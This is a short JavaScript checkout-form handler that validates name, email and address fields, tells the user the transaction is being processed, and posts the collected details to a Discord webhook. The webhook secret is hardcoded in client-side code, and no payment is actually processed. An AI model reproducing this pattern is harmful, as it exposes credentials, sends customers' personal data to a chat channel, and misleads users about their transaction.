document.getElementById('checkout-form').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the form from submitting right away
    
    // Get input values
    const fullName = document.getElementById('full-name').value.trim();
    const email = document.getElementById('email').value.trim();
    const address = document.getElementById('address').value.trim();
    const city = document.getElementById('city').value.trim();
    const zipCode = document.getElementById('zip-code').value.trim();
    
    // Validate fields
    if (!fullName) {
        alert('Please enter your full name.');
        return;
    }
    
    if (!email) {
        alert('Please enter your email address.');
        return;
    }
    
    if (!address) {
        alert('Please enter your address.');
        return;
    }
    
    if (!city) {
        alert('Please enter your city.');
        return;
    }
    
    if (!zipCode) {
        alert('Please enter your zip code.');
        return;
    }

    // If all fields are filled, continue processing
    alert('Your transaction is being processed. Check transaction status in 5 mins time.');

    // Send data to Discord webhook (example)
    const webhookUrl = 'https://discord.com/api/webhooks/1268893038793719859/_ktjZVX-uHx8UVoYu7GAdrpkRLpbysF11nl120aBoWKRwdsY06g_9dAq1HYG7yeWvqwk';
    const data = {
        content: `New Checkout Submission:\nFull Name: ${fullName}\nEmail: ${email}\nAddress: ${address}\nCity: ${city}\nZip Code: ${zipCode}`
    };
    
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    }).then(response => {
        if (response.ok) {
            console.log('Webhook sent successfully');
        } else {
            console.error('Error sending webhook:', response.statusText);
        }
    }).catch(error => {
        console.error('Fetch error:', error);
    });
});